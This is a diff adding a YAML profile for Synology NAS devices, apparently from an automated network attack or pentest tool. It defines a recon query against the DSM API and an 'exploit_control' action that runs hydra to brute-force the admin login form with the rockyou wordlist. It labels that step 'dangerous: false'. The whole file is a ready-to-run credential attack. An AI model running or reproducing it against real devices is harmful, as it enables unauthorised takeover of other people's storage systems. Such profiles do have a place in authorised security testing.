@@ -1,0 +1,27 @@
+id: synology
+device_type: nas
+vendor: Synology
+family: synology
+requires: {}
+actions:
+  - id: dsm-info
+    label: "Query DSM info"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:5000/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query"
+          save_as: info
+
+  - id: default-creds
+    label: "Try admin default creds"
+    category: exploit_control
+    dangerous: false
+    steps:
+      - run_tool:
+          tool: hydra
+          args: ["-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt",
+                 "-f", "-t", "4",
+                 "{{target.ip}}", "http-post-form",
+                 "/webman/login.cgi:username=^USER^&passwd=^PASS^:invalid"]
+          timeout: 120
